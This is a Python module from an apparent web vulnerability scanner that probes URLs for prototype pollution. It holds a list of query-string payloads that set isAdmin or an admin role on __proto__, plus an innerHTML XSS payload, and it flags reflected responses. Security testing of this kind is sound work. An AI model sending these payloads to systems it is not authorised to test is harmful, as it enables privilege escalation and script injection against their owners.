"""Advanced prototype pollution: gadget chains, PP to XSS/RCE."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

PP_PAYLOADS = [
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "constructor[prototype][isAdmin]=true",
    "__proto__[toString]=polluted",
    "__proto__[valueOf]=polluted",
    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    base_url = parsed._replace(query="").geturl()
    for payload in PP_PAYLOADS:
        test_url = base_url + "?" + payload
        r = get(test_url)
        if r.status == 0:
            continue
        # check if polluted property reflected or behavior changed
        if "polluted" in (r.text or "").lower() or "isAdmin" in (r.text or ""):
            findings.append(Finding(
                id="pp-adv-{}".format(hash(test_url) & 0xffff),
                target=parsed.netloc,
                type="Prototype Pollution (advanced)",
                severity="high",
                url=test_url,
                parameter="__proto__",
                payload=payload,
                evidence="Polluted property reflected/accepted",
                response_snippet=r.snippet(200),
                confidence=0.5,
            ))
            break
    log_event(parsed.netloc, "pp_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
